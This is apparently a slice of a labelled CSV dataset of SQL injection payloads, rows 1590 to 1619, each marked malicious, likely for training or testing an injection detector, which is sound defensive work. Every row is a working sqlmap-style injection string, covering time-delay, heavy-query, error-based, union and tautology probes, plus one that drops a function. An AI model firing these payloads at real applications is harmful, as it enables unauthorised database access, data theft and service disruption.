row_index,payload_norm,label,sqli_type_hint
1590,"1%"" ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
1591,1 where 8506 = 8506,1,
1592,1' ) as qcse where 4147 = 4147 waitfor delay '0:0:5'--,1,
1593,1' ) as inid where 7812 = 7812 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,1,
1594,"1%' ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( '%' = '",1,
1595,"1' ) where 1577 = 1577 union all select null,null,null,null,null,null#",1,
1596,waitfor delay '0:0:5' and ( ( 'nvqf' = 'nvqf,1,
1597,"1"" ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ( ""ftjg"" = ""ftjg",1,
1598,"end and ""xouo"" like ""xouo",1,
1599,"1' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and 'yvzf' = 'yvzf",1,
1600,1' where 7036 = 7036,1,
1601,1'|| ( select 'goen' from dual where 8586 = 8586,1,
1602,select case when 2640 = 9249 then 1 else null end--,1,
1603,"1' where 1836 = 1836 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,
1604,1' ) ) as mqnv where 9831 = 9831,1,
1605,if ( 5896 = 4251 ) select 5896 else drop function xmyk--,1,
1606,select ( case when ( 8331 = 5625 ) then 8331 else 8331* ( select 8331 from mysql.db ) end ) #,1,
1607,1' ) and 3560 = 5467--,1,
1608,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( '%' = '",1,
1609,"-6632 ) union all select 4073,4073,4073,4073,4073,4073,4073,4073--",1,
1610,-8513' union all select 7414--,1,
1611,"-9934"" ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""xecb"" like ""xecb",1,
1612,"1%"" ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ""%"" = """,1,
1613,1' ) ) as ypgz where 8704 = 8704,1,
1614,"-5726%"" ) ) or 6872 = 6872 and ( ( ""%"" = """,1,
1615,"1%' ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( '%' = '",1,
1616,1 where 1299 = 1299,1,
1617,1 ) ) and sleep ( 5 ) #,1,
1618,-6529' ) or ( 4309 = 1601 ) *1601,1,
1619,"1' ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'xdui' like 'xdui",1,
